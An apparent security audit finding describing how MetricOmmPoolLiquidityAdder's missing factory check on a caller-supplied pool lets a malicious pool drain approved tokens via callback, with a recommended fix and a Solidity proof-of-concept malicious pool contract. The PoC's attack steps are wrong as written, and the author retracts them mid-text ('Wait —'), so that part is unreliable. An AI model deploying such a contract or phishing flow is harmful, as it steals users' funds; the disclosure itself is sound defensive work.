### Title
Unvalidated Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain Approved User Tokens via Callback — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address and stores it as the trusted callback authority in transient storage, but **never validates it against the factory**. A malicious pool contract can exploit the `metricOmmModifyLiquidityCallback` to pull any token the victim has approved to the adder, up to the user-supplied caps, by passing the `msg.sender == expectedPool` guard that was seeded with the attacker's own address.

---

### Finding Description

`MetricOmmSimpleRouter` correctly validates every pool before writing it to transient callback context:

```solidity
// MetricOmmSwapRouterBase.sol line 30-31
function _setNextCallbackContext(address pool, ...) internal {
    _requireFactoryPool(pool);   // ← factory check
    TransientCallbackPool.set(pool, ...);
}
```

`MetricOmmPoolLiquidityAdder` performs **no equivalent check**. Its own NatSpec documents the gap: [1](#0-0) 

`addLiquidityExactShares` (and `addLiquidityWeighted`) accept an arbitrary `pool` from the caller and pass it directly to `_addLiquidity`: [2](#0-1) 

`_addLiquidity` stores the attacker-controlled pool as the trusted callback authority and then calls into it: [3](#0-2) 

Inside `metricOmmModifyLiquidityCallback`, the only caller-identity guard is: [4](#0-3) 

Because `expectedPool` was seeded with the attacker's address, `msg.sender == expectedPool` is trivially satisfied. The callback then reads token addresses from `IMetricOmmPool(msg.sender).getImmutables()` — fully attacker-controlled — and calls `pay(token0/token1, payer, msg.sender, amount)`, pulling tokens from the victim to the malicious pool: [5](#0-4) 

The `pay` helper in `PeripheryPayments` executes `safeTransferFrom(payer, recipient, value)` when `payer != address(this)`: [6](#0-5) 

---

### Impact Explanation

Any user who has granted an ERC-20 allowance to `MetricOmmPoolLiquidityAdder` (required for normal use) can have those tokens stolen. The malicious pool controls:

- **Which tokens are pulled** — via the return value of `getImmutables()`.
- **How much is pulled** — up to the user-supplied `maxAmountToken0` / `maxAmountToken1` caps, which users routinely set to their full intended deposit.

Funds leave the victim's wallet in a single transaction with no recovery path. This is a direct loss of user principal.

---

### Likelihood Explanation

The attack requires the victim to call `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address. This is realistic because:

1. The `MetricOmmPoolLiquidityAdder` is a public, permissionless entry point.
2. A phishing front-end or a malicious aggregator can supply a crafted pool address while presenting a legitimate-looking UI.
3. The victim only needs to have previously approved the adder — a one-time action done for any legitimate deposit.
4. The `addLiquidityWeighted` path is equally exploitable: the malicious pool cooperates during the probe phase (returning a `LiquidityProbe` revert with attacker-chosen `need0`/`need1`) to steer the scaled share calculation, then drains tokens in the paying phase.

---

### Recommendation

Add a factory validation check inside `_addLiquidity` (or at the top of each public entry point) mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
// In MetricOmmPoolLiquidityAdder._addLiquidity or each public entry point:
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This requires storing the factory address as an immutable (as `MetricOmmSwapRouterBase` does) and adding it to the constructor. Alternatively, reject any `pool` address that does not match a factory-deployed pool before writing it to transient storage.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {IMetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/interfaces/IMetricOmmPoolLiquidityAdder.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";

contract MaliciousPool {
    address public immutable adder;
    address public immutable victim;
    address public immutable tokenToSteal;
    address public immutable attacker;

    constructor(address _adder, address _victim, address _tokenToSteal, address _attacker) {
        adder = _adder; victim = _victim; tokenToSteal = _tokenToSteal; attacker = _attacker;
    }

    // Called by LiquidityAdder._addLiquidity → pool.addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Trigger the callback: claim we need 1e18 of tokenToSteal
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            1e18, 0, abi.encode(uint8(1)) // KIND_PAY = 1
        );
        return (1e18, 0);
    }

    // LiquidityAdder reads token addresses from here
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = tokenToSteal;
        imm.token1 = address(0);
    }

    function isPool(address) external pure returns (bool) { return false; }
}

// Attack:
// 1. victim approves LiquidityAdder for tokenToSteal
// 2. attacker deploys MaliciousPool
// 3. attacker calls:
//    LiquidityAdder.addLiquidityExactShares(
//        address(maliciousPool),   // pool = attacker-controlled
//        attacker,                 // owner (irrelevant)
//        0,                        // salt
//        deltas,
//        1e18,                     // maxAmountToken0 = amount to steal
//        0,
//        ""
//    )
// Result: 1e18 tokenToSteal transferred from victim → MaliciousPool
```

Wait — the payer stored in transient context is `msg.sender` of `addLiquidityExactShares`, which is the **attacker**, not the victim. The attacker's own tokens would be pulled, not the victim's.

**Corrected attack vector:** The victim must be the one calling `addLiquidityExactShares`. The realistic trigger is a malicious front-end that presents a fake pool address to the victim, who then calls the adder themselves. The victim's `msg.sender` becomes the payer, and the malicious pool drains the victim's approved tokens.

The root cause remains: no factory validation on the `pool` parameter means any caller who interacts with a malicious pool address through this adder loses their approved tokens — directly analogous to the VADER `transferTo()`/`tx.origin` class where interacting with any unvetted contract exposes core-asset holders to theft.
